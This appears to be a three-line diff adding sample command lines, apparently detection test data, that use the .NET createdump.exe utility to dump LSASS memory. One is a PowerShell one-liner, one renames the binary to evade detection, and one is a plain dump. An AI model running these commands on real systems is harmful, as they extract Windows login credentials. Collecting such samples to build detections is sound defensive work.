@@ -1,0 +1,3 @@
+"powershell.exe" & {$exePath =  resolve-path \""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe\"" & \""$exePath\"" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id}
+copy createdump.exe not_a_dump.exe && not_a_dump.exe --full --name /tmp/lsass_dump.bin 632
+createdump.exe -f /tmp/test.dmp -u 632
